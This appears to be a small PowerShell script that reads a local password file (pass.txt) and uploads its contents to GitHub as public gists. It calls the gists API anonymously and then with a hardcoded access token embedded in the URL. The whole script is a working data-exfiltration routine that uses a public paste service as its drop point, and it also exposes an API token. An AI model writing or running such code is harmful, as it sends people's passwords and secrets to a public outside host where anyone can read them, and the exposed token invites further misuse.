$URL = "https://api.github.com"
$Endpoint = "/gists"

$URLAnon = "$URL$Endpoint"

$password = Get-Content C:\Users\ASUS\pass.txt

$JSON = ConvertTo-Json @{
          description = "test fetch";
          public =  $true;
          files = @{
            "file1.txt" = @{
              content = $password
            }
          }
        }


$gist = Invoke-RestMethod -Method Post -Uri $URLAnon -Body $JSON

$Token = "?access_token=219878b8de9d3911dc27e93109547956f2acc253"
$URLSecure = "$URL$Endpoint$Token"

$gist = Invoke-RestMethod -Method Post -Uri $URLSecure -Body $JSON

$URLEdit = "$URL$Endpoint/$($gist.id)$Token"

$JSON2 = ConvertTo-Json @{
          description = "first password fetch2";
          public =  $true;
          files = @{
            "file1.txt" = @{
              content = $password
            }
          }
        }

$gist = Invoke-RestMethod -Method Post -Uri $URLEdit -Body $JSON2